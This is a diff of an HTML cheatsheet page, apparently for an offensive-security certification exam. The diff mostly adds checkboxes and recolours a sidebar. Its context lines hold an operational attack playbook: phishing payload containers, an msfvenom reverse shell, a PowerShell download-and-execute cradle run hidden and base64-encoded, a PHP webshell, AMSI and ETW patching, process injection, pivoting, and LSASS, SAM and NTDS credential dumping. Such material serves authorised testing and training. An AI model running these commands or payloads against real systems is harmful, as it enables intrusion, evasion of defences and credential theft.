@@ -44,24 +44,26 @@
   /* Index sidebar color flow */
   .section-flow-1{background-color:hsl(120, 20%, 94%);}
   .section-flow-1 .dropdown-container,.section-flow-1 .nested-dropdown-container{background-color:hsl(120, 20%, 94%);}
-  .section-flow-2{background-color:hsl(120, 26%, 73%);}
-  .section-flow-2 .dropdown-container,.section-flow-2 .nested-dropdown-container{background-color:hsl(120, 26%, 73%);}
-  .section-flow-3{background-color:hsl(120, 30%, 57%);}
-  .section-flow-3 .dropdown-container,.section-flow-3 .nested-dropdown-container{background-color:hsl(120, 30%, 57%);}
-  .section-flow-4{background-color:hsl(120, 33%, 46%);}
-  .section-flow-4 .dropdown-container,.section-flow-4 .nested-dropdown-container{background-color:hsl(120, 33%, 46%);}
-  .section-flow-5{background-color:hsl(120, 35%, 41%);}
-  .section-flow-5 .dropdown-container,.section-flow-5 .nested-dropdown-container{background-color:hsl(120, 35%, 41%);}
-  .section-flow-6{background-color:hsl(120, 35%, 41%);}
-  .section-flow-6 .dropdown-container,.section-flow-6 .nested-dropdown-container{background-color:hsl(120, 35%, 41%);}
-  .section-flow-7{background-color:hsl(120, 33%, 46%);}
-  .section-flow-7 .dropdown-container,.section-flow-7 .nested-dropdown-container{background-color:hsl(120, 33%, 46%);}
-  .section-flow-8{background-color:hsl(120, 30%, 57%);}
-  .section-flow-8 .dropdown-container,.section-flow-8 .nested-dropdown-container{background-color:hsl(120, 30%, 57%);}
-  .section-flow-9{background-color:hsl(120, 26%, 73%);}
-  .section-flow-9 .dropdown-container,.section-flow-9 .nested-dropdown-container{background-color:hsl(120, 26%, 73%);}
-  .section-flow-10{background-color:hsl(120, 20%, 94%);}
-  .section-flow-10 .dropdown-container,.section-flow-10 .nested-dropdown-container{background-color:hsl(120, 20%, 94%);}
+  .section-flow-2{background-color:hsl(120, 25%, 75%);}
+  .section-flow-2 .dropdown-container,.section-flow-2 .nested-dropdown-container{background-color:hsl(120, 25%, 75%);}
+  .section-flow-3{background-color:hsl(120, 30%, 59%);}
+  .section-flow-3 .dropdown-container,.section-flow-3 .nested-dropdown-container{background-color:hsl(120, 30%, 59%);}
+  .section-flow-4{background-color:hsl(120, 33%, 49%);}
+  .section-flow-4 .dropdown-container,.section-flow-4 .nested-dropdown-container{background-color:hsl(120, 33%, 49%);}
+  .section-flow-5{background-color:hsl(120, 34%, 42%);}
+  .section-flow-5 .dropdown-container,.section-flow-5 .nested-dropdown-container{background-color:hsl(120, 34%, 42%);}
+  .section-flow-6{background-color:hsl(120, 35%, 40%);}
+  .section-flow-6 .dropdown-container,.section-flow-6 .nested-dropdown-container{background-color:hsl(120, 35%, 40%);}
+  .section-flow-7{background-color:hsl(120, 34%, 42%);}
+  .section-flow-7 .dropdown-container,.section-flow-7 .nested-dropdown-container{background-color:hsl(120, 34%, 42%);}
+  .section-flow-8{background-color:hsl(120, 33%, 49%);}
+  .section-flow-8 .dropdown-container,.section-flow-8 .nested-dropdown-container{background-color:hsl(120, 33%, 49%);}
+  .section-flow-9{background-color:hsl(120, 30%, 59%);}
+  .section-flow-9 .dropdown-container,.section-flow-9 .nested-dropdown-container{background-color:hsl(120, 30%, 59%);}
+  .section-flow-10{background-color:hsl(120, 25%, 75%);}
+  .section-flow-10 .dropdown-container,.section-flow-10 .nested-dropdown-container{background-color:hsl(120, 25%, 75%);}
+  .section-flow-11{background-color:hsl(120, 20%, 94%);}
+  .section-flow-11 .dropdown-container,.section-flow-11 .nested-dropdown-container{background-color:hsl(120, 20%, 94%);}
   </style>
 
 </head>
@@ -176,13 +178,13 @@
           <div class="col-lg-12">
             <div class="cheatsheet-content">
 <h2 id="methodology">1. Methodology</h2>
-<ul><li>Operator-checklist methodology. Each phase walks the engagement end-to-end: pick the primitive, validate the precondition, run the command, verify the outcome, document, move on.</li></ul>
+<ul><li><input type="checkbox"> Operator-checklist methodology. Each phase walks the engagement end-to-end: pick the primitive, validate the precondition, run the command, verify the outcome, document, move on.</li></ul>
 
 <h3 id="methodology-reconnaissance">1.1 Reconnaissance</h3>
-<ul><li>Map the surface before you touch it. Scan &rarr; enumerate &rarr; research &rarr; attack &mdash; exhaust each stage before advancing.</li></ul>
+<ul><li><input type="checkbox"> Map the surface before you touch it. Scan &rarr; enumerate &rarr; research &rarr; attack &mdash; exhaust each stage before advancing.</li></ul>
 <h3 id="methodology-reconnaissance-external-scan">1.1.1 External Scanning</h3>
   <ul>
-    <li>Discover hosts and the full port surface:</li>
+    <li><input type="checkbox"> Discover hosts and the full port surface:</li>
   </ul>
 <pre><code class="language-bash"># Full TCP scan
 nmap -p- -T4 -Pn -oA scans/all-tcp [ip]
@@ -195,15 +197,15 @@ rustscan -a [ip] --greppable 2&gt;/dev/null \
   | grep -oP '\d+(?=/)' | paste -sd ',' - \
   | xargs -I{} nmap -p{} -sV -sC [ip]</code></pre>
   <ul>
-    <li>Service version &amp; default-script sweep on every open port:</li>
+    <li><input type="checkbox"> Service version &amp; default-script sweep on every open port:</li>
   </ul>
 <pre><code class="language-bash">nmap -p [ports] -sV -sC --version-intensity 9 -oA scans/vers [ip]</code></pre>
   <ul>
-    <li>Quick web banner check for any HTTP/HTTPS port:
+    <li><input type="checkbox"> Quick web banner check for any HTTP/HTTPS port:
       <ul>
-        <li><code>curl -ksI https://[ip]:[port]/</code></li>
-        <li><code>whatweb -a 3 https://[ip]:[port]/</code></li>
-        <li><code>nuclei -u https://[ip]:[port]/ -severity medium,high,critical</code></li>
+        <li><input type="checkbox"> <code>curl -ksI https://[ip]:[port]/</code></li>
+        <li><input type="checkbox"> <code>whatweb -a 3 https://[ip]:[port]/</code></li>
+        <li><input type="checkbox"> <code>nuclei -u https://[ip]:[port]/ -severity medium,high,critical</code></li>
       </ul>
     </li>
   </ul>
@@ -211,19 +213,19 @@ rustscan -a [ip] --greppable 2&gt;/dev/null \
 
 <h3 id="methodology-reconnaissance-internal-scan">1.1.2 Internal Scanning From the Foothold</h3>
   <ul>
-    <li>Pick the right scanner for the foothold&rsquo;s posture:
+    <li><input type="checkbox"> Pick the right scanner for the foothold&rsquo;s posture:
       <ul>
-        <li>No nmap: Meterpreter <code>portscan</code> module</li>
-        <li>PowerShell only: <code>1..1024 | %{ Test-NetConnection [ip] -Port $_ }</code></li>
-        <li>BOF: <code>portscan [target] [ports] arp 1024</code></li>
-        <li>Smuggle nmap via SOCKS: <code>proxychains nmap -sT -Pn -p- [ip]</code></li>
+        <li><input type="checkbox"> No nmap: Meterpreter <code>portscan</code> module</li>
+        <li><input type="checkbox"> PowerShell only: <code>1..1024 | %{ Test-NetConnection [ip] -Port $_ }</code></li>
+        <li><input type="checkbox"> BOF: <code>portscan [target] [ports] arp 1024</code></li>
+        <li><input type="checkbox"> Smuggle nmap via SOCKS: <code>proxychains nmap -sT -Pn -p- [ip]</code></li>
       </ul>
     </li>
-    <li>Discover subnets, not just hosts:
+    <li><input type="checkbox"> Discover subnets, not just hosts:
       <ul>
-        <li>Read <code>route print</code> / <code>ip route</code> for routing tables</li>
-        <li>Read <code>arp -a</code> for L2 neighbours</li>
-        <li>Read DNS zone hints from <code>/etc/resolv.conf</code> / <code>ipconfig /displaydns</code></li>
+        <li><input type="checkbox"> Read <code>route print</code> / <code>ip route</code> for routing tables</li>
+        <li><input type="checkbox"> Read <code>arp -a</code> for L2 neighbours</li>
+        <li><input type="checkbox"> Read DNS zone hints from <code>/etc/resolv.conf</code> / <code>ipconfig /displaydns</code></li>
       </ul>
     </li>
   </ul>
@@ -231,37 +233,37 @@ rustscan -a [ip] --greppable 2&gt;/dev/null \
 <p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/" target="_blank" rel="noopener noreferrer">HackTricks</a> &middot; <a href="https://wadcoms.github.io/" target="_blank" rel="noopener noreferrer">WADComs</a></p>
 
 <h3 id="methodology-initial-access">1.2 Initial Access</h3>
-<ul><li>Land code execution with the least-noisy delivery the engagement allows.</li></ul>
+<ul><li><input type="checkbox"> Land code execution with the least-noisy delivery the engagement allows.</li></ul>
 <h3 id="methodology-initial-access-phishing">1.2.1 Phishing</h3>
   <ul>
-    <li>Pick the delivery container that survives the mail gateway:
+    <li><input type="checkbox"> Pick the delivery container that survives the mail gateway:
       <ul>
-        <li>Macro-enabled Office doc (.docm / .xlsm)</li>
-        <li>HTA via .url shortcut</li>
-        <li>ISO/IMG container to defeat MOTW</li>
-        <li>OneNote .one with embedded payload</li>
-        <li>Calendar .ics with payload-bearing URL</li>
+        <li><input type="checkbox"> Macro-enabled Office doc (.docm / .xlsm)</li>
+        <li><input type="checkbox"> HTA via .url shortcut</li>
+        <li><input type="checkbox"> ISO/IMG container to defeat MOTW</li>
+        <li><input type="checkbox"> OneNote .one with embedded payload</li>
+        <li><input type="checkbox"> Calendar .ics with payload-bearing URL</li>
       </ul>
     </li>
-    <li>Stage the loader so it survives runtime AV:
+    <li><input type="checkbox"> Stage the loader so it survives runtime AV:
       <ul>
-        <li>Keep shellcode encrypted at rest</li>
-        <li>Resolve APIs at runtime, not via IAT</li>
-        <li>Use indirect syscalls for sensitive Nt* calls</li>
+        <li><input type="checkbox"> Keep shellcode encrypted at rest</li>
+        <li><input type="checkbox"> Resolve APIs at runtime, not via IAT</li>
+        <li><input type="checkbox"> Use indirect syscalls for sensitive Nt* calls</li>
       </ul>
     </li>
-    <li>Add a callback ping that does not look like a callback:
+    <li><input type="checkbox"> Add a callback ping that does not look like a callback:
       <ul>
-        <li>Single HEAD request to a CDN-fronted URL</li>
-        <li>DNS TXT lookup to your authoritative server</li>
-        <li>Image fetch to a normal-looking subdomain</li>
+        <li><input type="checkbox"> Single HEAD request to a CDN-fronted URL</li>
+        <li><input type="checkbox"> DNS TXT lookup to your authoritative server</li>
+        <li><input type="checkbox"> Image fetch to a normal-looking subdomain</li>
       </ul>
     </li>
-    <li>Pre-flight checks before sending:
+    <li><input type="checkbox"> Pre-flight checks before sending:
       <ul>
-        <li>SPF/DKIM/DMARC on the sending domain</li>
-        <li>Mail body renders identically in Outlook + OWA + Gmail</li>
-        <li>Macro fires under Protected View &rarr; OK to send</li>
+        <li><input type="checkbox"> SPF/DKIM/DMARC on the sending domain</li>
+        <li><input type="checkbox"> Mail body renders identically in Outlook + OWA + Gmail</li>
+        <li><input type="checkbox"> Macro fires under Protected View &rarr; OK to send</li>
       </ul>
     </li>
   </ul>
@@ -318,7 +320,7 @@ self.close
 
 <h3 id="methodology-initial-access-payloads">1.2.2 Payloads</h3>
   <ul>
-    <li>C# loader checklist:</li>
+    <li><input type="checkbox"> C# loader checklist:</li>
   </ul>
 <pre><code class="language-bash"># Generate shellcode
 msfvenom -p windows/x64/meterpreter/reverse_https \
@@ -373,10 +375,10 @@ class Loader {
     }
 }</code></pre>
   <ul>
-    <li>AMSI bypass before any in-process .NET assembly load</li>
-    <li>Encrypt shellcode with AES or XOR, decrypt at runtime</li>
-    <li>Test with <code>sgn -a 32 shellcode.bin</code> for polymorphic encoding</li>
-    <li>PowerShell loader checklist:</li>
+    <li><input type="checkbox"> AMSI bypass before any in-process .NET assembly load</li>
+    <li><input type="checkbox"> Encrypt shellcode with AES or XOR, decrypt at runtime</li>
+    <li><input type="checkbox"> Test with <code>sgn -a 32 shellcode.bin</code> for polymorphic encoding</li>
+    <li><input type="checkbox"> PowerShell loader checklist:</li>
   </ul>
 <pre><code class="language-powershell"># Download cradle (encrypted)
 IEX(New-Object Net.WebClient).DownloadString('http://[ip]/loader.ps1')
@@ -386,23 +388,23 @@ $cmd = 'IEX(New-Object Net.WebClient).DownloadString("http://[ip]/loader.ps1")'
 $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
 powershell -nop -w hidden -enc $b64</code></pre>
   <ul>
-    <li>Patch AMSI early: <code>[Ref].Assembly.GetType(...)</code> pattern (publicly known)</li>
-    <li>Patch ETW: <code>EtwEventWrite</code> patch via reflection</li>
-    <li>Compile with <code>PS2EXE</code> when an .exe is needed</li>
-    <li>Test with CLM on a staging host</li>
-    <li>Webshell options when web is the only entry:
+    <li><input type="checkbox"> Patch AMSI early: <code>[Ref].Assembly.GetType(...)</code> pattern (publicly known)</li>
+    <li><input type="checkbox"> Patch ETW: <code>EtwEventWrite</code> patch via reflection</li>
+    <li><input type="checkbox"> Compile with <code>PS2EXE</code> when an .exe is needed</li>
+    <li><input type="checkbox"> Test with CLM on a staging host</li>
+    <li><input type="checkbox"> Webshell options when web is the only entry:
       <ul>
-        <li>ASPX cmd shell</li>
-        <li>JSP cmd shell</li>
-        <li>PHP one-liner: <code>&lt;?=`$_GET[0]`?&gt;</code></li>
-        <li>Tiny stagers that pull the second stage in memory</li>
+        <li><input type="checkbox"> ASPX cmd shell</li>
+        <li><input type="checkbox"> JSP cmd shell</li>
+        <li><input type="checkbox"> PHP one-liner: <code>&lt;?=`$_GET[0]`?&gt;</code></li>
+        <li><input type="checkbox"> Tiny stagers that pull the second stage in memory</li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-loader-skeleton">1.2.3 Shellcode Loader Skeleton (C#)</h3>
 
-              <ul><li>The exam expects you to <em>write</em> loaders rather than reuse signed ones. The skeleton below allocates RWX memory, copies in shellcode, and creates a thread &mdash; the simplest in-memory pattern. Iterate on it: indirect syscalls, AMSI patching, sleep masking, and parent PID spoofing all start here.</li></ul>
+              <ul><li><input type="checkbox"> The exam expects you to <em>write</em> loaders rather than reuse signed ones. The skeleton below allocates RWX memory, copies in shellcode, and creates a thread &mdash; the simplest in-memory pattern. Iterate on it: indirect syscalls, AMSI patching, sleep masking, and parent PID spoofing all start here.</li></ul>
               <pre><code class="language-csharp">// loader.cs &mdash; compile with: csc /platform:x64 /unsafe loader.cs
 // or on Kali:  mcs -unsafe loader.cs
 using System;
@@ -426,19 +428,19 @@ donut -i SharpHound.exe -o sh.bin -f 1</code></pre>
 
 <h3 id="methodology-initial-access-shell-upgrade">1.2.4 Upgrading Shells</h3>
   <ul>
-    <li>Upgrade reverse shell to a fully interactive PTY (Linux):
+    <li><input type="checkbox"> Upgrade reverse shell to a fully interactive PTY (Linux):
       <ul>
-        <li><code>python3 -c "import pty; pty.spawn('/bin/bash')"</code></li>
-        <li><code>export TERM=xterm-256color</code></li>
-        <li>Ctrl-Z, then <code>stty raw -echo; fg</code>, Enter</li>
-        <li><code>stty rows 50 cols 200</code> to match your terminal</li>
+        <li><input type="checkbox"> <code>python3 -c "import pty; pty.spawn('/bin/bash')"</code></li>
+        <li><input type="checkbox"> <code>export TERM=xterm-256color</code></li>
+        <li><input type="checkbox"> Ctrl-Z, then <code>stty raw -echo; fg</code>, Enter</li>
+        <li><input type="checkbox"> <code>stty rows 50 cols 200</code> to match your terminal</li>
       </ul>
     </li>
-    <li>Upgrade Windows shell to Meterpreter or Beacon:
+    <li><input type="checkbox"> Upgrade Windows shell to Meterpreter or Beacon:
       <ul>
-        <li>Use the same shell to drop and execute a staged payload</li>
-        <li>Or use a one-liner: <code>powershell -nop -w hidden -enc &lt;b64&gt;</code></li>
-        <li>Confirm the new callback before closing the old shell</li>
+        <li><input type="checkbox"> Use the same shell to drop and execute a staged payload</li>
+        <li><input type="checkbox"> Or use a one-liner: <code>powershell -nop -w hidden -enc &lt;b64&gt;</code></li>
+        <li><input type="checkbox"> Confirm the new callback before closing the old shell</li>
       </ul>
     </li>
   </ul>
@@ -464,19 +466,19 @@ sessions -u [session-id]</code></pre>
 
 <h3 id="methodology-initial-access-process-injection">1.2.5 Process Injection & Migration</h3>
   <ul>
-    <li>Pick a target process appropriate for the payload:
+    <li><input type="checkbox"> Pick a target process appropriate for the payload:
       <ul>
-        <li>Long-lived: <code>explorer.exe</code>, <code>svchost.exe</code></li>
-        <li>Short-lived but useful: spawned <code>notepad.exe</code> under your token</li>
-        <li>Avoid Office processes for post-ex; signature traps abound</li>
+        <li><input type="checkbox"> Long-lived: <code>explorer.exe</code>, <code>svchost.exe</code></li>
+        <li><input type="checkbox"> Short-lived but useful: spawned <code>notepad.exe</code> under your token</li>
+        <li><input type="checkbox"> Avoid Office processes for post-ex; signature traps abound</li>
       </ul>
     </li>
-    <li>Choose the technique by EDR posture:
+    <li><input type="checkbox"> Choose the technique by EDR posture:
       <ul>
-        <li>Classic <code>VirtualAllocEx</code> + <code>WriteProcessMemory</code> + <code>CreateRemoteThread</code> (noisy, easy)</li>
-        <li>APC injection (<code>QueueUserAPC</code> + <code>NtAlertResumeThread</code>) for stealthier delivery</li>
-        <li>Process hollowing for fresh-process payloads</li>
-        <li>Module stomping when EDR alerts on RWX allocations</li>
+        <li><input type="checkbox"> Classic <code>VirtualAllocEx</code> + <code>WriteProcessMemory</code> + <code>CreateRemoteThread</code> (noisy, easy)</li>
+        <li><input type="checkbox"> APC injection (<code>QueueUserAPC</code> + <code>NtAlertResumeThread</code>) for stealthier delivery</li>
+        <li><input type="checkbox"> Process hollowing for fresh-process payloads</li>
+        <li><input type="checkbox"> Module stomping when EDR alerts on RWX allocations</li>
       </ul>
     </li>
   </ul>
@@ -632,22 +634,22 @@ ResumeThread(hThread);</code></pre>
 <p><strong>General references:</strong> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings</a> &middot; <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer">LOLBAS</a> &middot; <a href="https://attack.mitre.org/techniques/T1059/" target="_blank" rel="noopener noreferrer">MITRE T1059 Cmd & Script</a></p>
 
 <h3 id="methodology-tunneling">1.3 Tunneling</h3>
-<ul><li>Pivot through the foothold into restricted subnets without breaking ops.</li></ul>
+<ul><li><input type="checkbox"> Pivot through the foothold into restricted subnets without breaking ops.</li></ul>
 <h3 id="methodology-tunneling-ligolo">1.3.1 Ligolo-ng</h3>
   <ul>
-    <li>Set up the proxy server side:</li>
+    <li><input type="checkbox"> Set up the proxy server side:</li>
   </ul>
 <pre><code class="language-bash"># Attacker: create TUN interface and start proxy
 sudo ip tuntap add user [you] mode tun ligolo
 sudo ip link set ligolo up
 ./proxy -selfcert -laddr 0.0.0.0:11601</code></pre>
   <ul>
-    <li>Drop the agent on the foothold:</li>
+    <li><input type="checkbox"> Drop the agent on the foothold:</li>
   </ul>
 <pre><code class="language-bash"># Foothold: connect agent back to proxy
 ./agent -connect [ip]:11601 -ignore-cert</code></pre>
   <ul>
-    <li>Route attacker traffic into the foothold&rsquo;s subnet:</li>
+    <li><input type="checkbox"> Route attacker traffic into the foothold&rsquo;s subnet:</li>
   </ul>
 <pre><code class="language-bash"># In ligolo proxy console
 session     # select the agent session
@@ -663,18 +665,18 @@ curl https://[internal-host]</code></pre>
 
 <h3 id="methodology-tunneling-sshuttle">1.3.2 sshuttle</h3>
   <ul>
-    <li>When the foothold is Linux with SSH key access:
+    <li><input type="checkbox"> When the foothold is Linux with SSH key access:
       <ul>
-        <li><code>sshuttle -r user@[foothold] [subnet]/[mask]</code></li>
-        <li>Add <code>--dns</code> to forward DNS through the tunnel</li>
-        <li>Add <code>-x [your-ip]</code> to exclude your management session</li>
+        <li><input type="checkbox"> <code>sshuttle -r user@[foothold] [subnet]/[mask]</code></li>
+        <li><input type="checkbox"> Add <code>--dns</code> to forward DNS through the tunnel</li>
+        <li><input type="checkbox"> Add <code>-x [your-ip]</code> to exclude your management session</li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-tunneling-metasploit-pivot">1.3.3 Metasploit Pivoting</h3>
   <ul>
-    <li>Set up a route through a Meterpreter session:</li>
+    <li><input type="checkbox"> Set up a route through a Meterpreter session:</li>
   </ul>
 <pre><code class="language-bash"># In meterpreter session
 run autoroute -s [subnet]/[mask]
@@ -693,21 +695,21 @@ proxychains4 -q nmap -sT -Pn -p- [internal-ip]</code></pre>
 
 <h3 id="methodology-tunneling-domain-fronting">1.3.4 Domain Fronting</h3>
   <ul>
-    <li>Confirm a CDN that still permits SNI/Host mismatch:
+    <li><input type="checkbox"> Confirm a CDN that still permits SNI/Host mismatch:
       <ul>
-        <li>Check current CDN provider docs &mdash; many have closed this</li>
-        <li>Validate with a test domain before staging C2</li>
+        <li><input type="checkbox"> Check current CDN provider docs &mdash; many have closed this</li>
+        <li><input type="checkbox"> Validate with a test domain before staging C2</li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-tunneling-dns-tunneling">1.3.5 DNS Tunneling</h3>
   <ul>
-    <li>When egress is locked to DNS only:
+    <li><input type="checkbox"> When egress is locked to DNS only:
       <ul>
-        <li>Set up an authoritative server for a controlled domain</li>
-        <li>Use Sliver DNS C2 or Iodine for raw tunnels</li>
-        <li>Validate latency &mdash; DNS C2 is slow; plan operations accordingly</li>
+        <li><input type="checkbox"> Set up an authoritative server for a controlled domain</li>
+        <li><input type="checkbox"> Use Sliver DNS C2 or Iodine for raw tunnels</li>
+        <li><input type="checkbox"> Validate latency &mdash; DNS C2 is slow; plan operations accordingly</li>
       </ul>
     </li>
   </ul>
@@ -715,35 +717,35 @@ proxychains4 -q nmap -sT -Pn -p- [internal-ip]</code></pre>
 <p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding" target="_blank" rel="noopener noreferrer">HackTricks Tunneling</a> &middot; <a href="https://attack.mitre.org/techniques/T1090/" target="_blank" rel="noopener noreferrer">MITRE T1090 Proxy</a></p>
 
 <h3 id="methodology-windows-postex">1.4 Windows Post Exploitation</h3>
-<ul><li>Situational awareness &rarr; escalate &rarr; evade &rarr; loot. Cycle until the host yields what the engagement needs.</li></ul>
+<ul><li><input type="checkbox"> Situational awareness &rarr; escalate &rarr; evade &rarr; loot. Cycle until the host yields what the engagement needs.</li></ul>
 <h3 id="methodology-windows-postex-sit-aware">1.4.1 Situational Awareness</h3>
   <ul>
-    <li>Identity and integrity:
+    <li><input type="checkbox"> Identity and integrity:
       <ul>
-        <li><code>whoami /all</code></li>
-        <li><code>net user [me] /domain</code></li>
-        <li>Token groups, privileges, integrity level</li>
+        <li><input type="checkbox"> <code>whoami /all</code></li>
+        <li><input type="checkbox"> <code>net user [me] /domain</code></li>
+        <li><input type="checkbox"> Token groups, privileges, integrity level</li>
       </ul>
     </li>
-    <li>Host posture:
+    <li><input type="checkbox"> Host posture:
       <ul>
-        <li><code>systeminfo</code> for OS build, hotfixes, domain</li>
-        <li><code>Get-CimInstance Win32_Product</code> for installed software</li>
-        <li><code>Get-Service | ?{$_.Status -eq "Running"}</code></li>
+        <li><input type="checkbox"> <code>systeminfo</code> for OS build, hotfixes, domain</li>
+        <li><input type="checkbox"> <code>Get-CimInstance Win32_Product</code> for installed software</li>
+        <li><input type="checkbox"> <code>Get-Service | ?{$_.Status -eq "Running"}</code></li>
       </ul>
     </li>
-    <li>Network posture:
+    <li><input type="checkbox"> Network posture:
       <ul>
-        <li><code>ipconfig /all</code> + <code>route print</code> + <code>arp -a</code></li>
-        <li><code>netstat -ano</code> for listeners and active sessions</li>
-        <li><code>Get-DnsClientServerAddress</code></li>
+        <li><input type="checkbox"> <code>ipconfig /all</code> + <code>route print</code> + <code>arp -a</code></li>
+        <li><input type="checkbox"> <code>netstat -ano</code> for listeners and active sessions</li>
+        <li><input type="checkbox"> <code>Get-DnsClientServerAddress</code></li>
       </ul>
     </li>
-    <li>Defence posture:
+    <li><input type="checkbox"> Defence posture:
       <ul>
-        <li><code>Get-MpComputerStatus</code> for Defender state</li>
-        <li><code>Get-MpPreference | select Exclusion*</code></li>
-        <li>Identify EDR drivers: <code>fltmc</code>, <code>driverquery /v</code></li>
+        <li><input type="checkbox"> <code>Get-MpComputerStatus</code> for Defender state</li>
+        <li><input type="checkbox"> <code>Get-MpPreference | select Exclusion*</code></li>
+        <li><input type="checkbox"> Identify EDR drivers: <code>fltmc</code>, <code>driverquery /v</code></li>
       </ul>
     </li>
   </ul>
@@ -751,33 +753,33 @@ proxychains4 -q nmap -sT -Pn -p- [internal-ip]</code></pre>
 
 <h3 id="methodology-windows-postex-privesc">1.4.2 Privilege Escalation</h3>
   <ul>
-    <li>Triage with an automated check first:
+    <li><input type="checkbox"> Triage with an automated check first:
       <ul>
-        <li>WinPEAS: <code>winpeas.exe quiet</code></li>
-        <li>PrivescCheck: <code>Invoke-PrivescCheck -Extended</code></li>
-        <li>Seatbelt: <code>Seatbelt.exe -group=all</code></li>
+        <li><input type="checkbox"> WinPEAS: <code>winpeas.exe quiet</code></li>
+        <li><input type="checkbox"> PrivescCheck: <code>Invoke-PrivescCheck -Extended</code></li>
+        <li><input type="checkbox"> Seatbelt: <code>Seatbelt.exe -group=all</code></li>
       </ul>
     </li>
-    <li>Look at the quick wins:
+    <li><input type="checkbox"> Look at the quick wins:
       <ul>
-        <li>AlwaysInstallElevated registry keys</li>
-        <li>Unquoted service paths with writable directories</li>
-        <li>Modifiable service binaries / configs</li>
-        <li>Writable autoruns or scheduled tasks</li>
-        <li>DLL hijack opportunities in the PATH</li>
+        <li><input type="checkbox"> AlwaysInstallElevated registry keys</li>
+        <li><input type="checkbox"> Unquoted service paths with writable directories</li>
+        <li><input type="checkbox"> Modifiable service binaries / configs</li>
+        <li><input type="checkbox"> Writable autoruns or scheduled tasks</li>
+        <li><input type="checkbox"> DLL hijack opportunities in the PATH</li>
       </ul>
     </li>
-    <li>Token primitives if SeImpersonate is held:
+    <li><input type="checkbox"> Token primitives if SeImpersonate is held:
       <ul>
-        <li>PrintSpoofer (Print Service)</li>
-        <li>RoguePotato / GodPotato (DCOM)</li>
-        <li>EfsPotato / SeManageVolumePrivilege variants</li>
+        <li><input type="checkbox"> PrintSpoofer (Print Service)</li>
+        <li><input type="checkbox"> RoguePotato / GodPotato (DCOM)</li>
+        <li><input type="checkbox"> EfsPotato / SeManageVolumePrivilege variants</li>
       </ul>
     </li>
-    <li>Software vuln route when configs are clean:
+    <li><input type="checkbox"> Software vuln route when configs are clean:
       <ul>
-        <li>Cross-check installed software against MSRC and Exploit-DB</li>
-        <li>Try kernel-mode CVE only when nothing else lands</li>
+        <li><input type="checkbox"> Cross-check installed software against MSRC and Exploit-DB</li>
+        <li><input type="checkbox"> Try kernel-mode CVE only when nothing else lands</li>
       </ul>
     </li>
   </ul>
@@ -828,28 +830,28 @@ proxychains4 -q nmap -sT -Pn -p- [internal-ip]</code></pre>
 
 <h3 id="methodology-windows-postex-defense-evasion">1.4.3 Defense Evasion</h3>
   <ul>
-    <li>AMSI before any in-process .NET / PowerShell load:
+    <li><input type="checkbox"> AMSI before any in-process .NET / PowerShell load:
       <ul>
-        <li>Reflection-based AmsiScanBuffer patch (publicly known pattern)</li>
-        <li>Hardware breakpoint method for hardened hosts</li>
+        <li><input type="checkbox"> Reflection-based AmsiScanBuffer patch (publicly known pattern)</li>
+        <li><input type="checkbox"> Hardware breakpoint method for hardened hosts</li>
       </ul>
     </li>
-    <li>ETW before any high-volume telemetry-emitting code:
+    <li><input type="checkbox"> ETW before any high-volume telemetry-emitting code:
       <ul>
-        <li>Patch <code>EtwEventWrite</code> in <code>ntdll</code></li>
-        <li>Or use <code>NtTraceEvent</code> patch for kernel-mode-bound paths</li>
+        <li><input type="checkbox"> Patch <code>EtwEventWrite</code> in <code>ntdll</code></li>
+        <li><input type="checkbox"> Or use <code>NtTraceEvent</code> patch for kernel-mode-bound paths</li>
       </ul>
     </li>
-    <li>PowerShell CLM bypass when CLM is enforced:
+    <li><input type="checkbox"> PowerShell CLM bypass when CLM is enforced:
       <ul>
-        <li>PowerShell v2 downgrade when v2 is present</li>
-        <li>Trusted-publisher bypass via signed loader</li>
+        <li><input type="checkbox"> PowerShell v2 downgrade when v2 is present</li>
+        <li><input type="checkbox"> Trusted-publisher bypass via signed loader</li>
       </ul>
     </li>
-    <li>Defender exclusions when an exclusion path is writable:
+    <li><input type="checkbox"> Defender exclusions when an exclusion path is writable:
       <ul>
-        <li>Read <code>HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions</code></li>
-        <li>Drop staged payloads into excluded directories</li>
+        <li><input type="checkbox"> Read <code>HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions</code></li>
+        <li><input type="checkbox"> Drop staged payloads into excluded directories</li>
       </ul>
     </li>
   </ul>
@@ -948,14 +950,14 @@ powershell -version 2 -c "IEX(...)"</code></pre>
 
 <h3 id="methodology-windows-postex-credential-access">1.4.4 Credential Access</h3>
   <ul>
-    <li>LSASS dump &mdash; only when authorised, prefer reflective approaches:
+    <li><input type="checkbox"> LSASS dump &mdash; only when authorised, prefer reflective approaches:
       <ul>
-        <li>Comsvcs.dll MiniDump LoLBin</li>
-        <li>NanoDump / pypykatz / dumpert</li>
-        <li>Process the dump offline with <code>pypykatz</code> or <code>mimikatz</code></li>
+        <li><input type="checkbox"> Comsvcs.dll MiniDump LoLBin</li>
+        <li><input type="checkbox"> NanoDump / pypykatz / dumpert</li>
+        <li><input type="checkbox"> Process the dump offline with <code>pypykatz</code> or <code>mimikatz</code></li>
       </ul>
     </li>
-    <li>SAM &amp; SYSTEM offline:</li>
+    <li><input type="checkbox"> SAM &amp; SYSTEM offline:</li>
   </ul>
 <pre><code class="language-bash"># On target (requires admin)
 reg save HKLM\SAM C:\Windows\Temp\sam.save
@@ -965,19 +967,19 @@ reg save HKLM\SECURITY C:\Windows\Temp\security.save
 # Download and process offline
 impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL</code></pre>
   <ul>
-    <li>NTDS from a domain controller:
+    <li><input type="checkbox"> NTDS from a domain controller:
       <ul>
-        <li><code>ntdsutil.exe</code> snapshot path</li>
-        <li><code>vssadmin</code> shadow copy + extract</li>
-        <li>Process with <code>secretsdump.py -ntds ntds.dit -system system.hive LOCAL</code></li>
+        <li><input type="checkbox"> <code>ntdsutil.exe</code> snapshot path</li>
+        <li><input type="checkbox"> <code>vssadmin</code> shadow copy + extract</li>
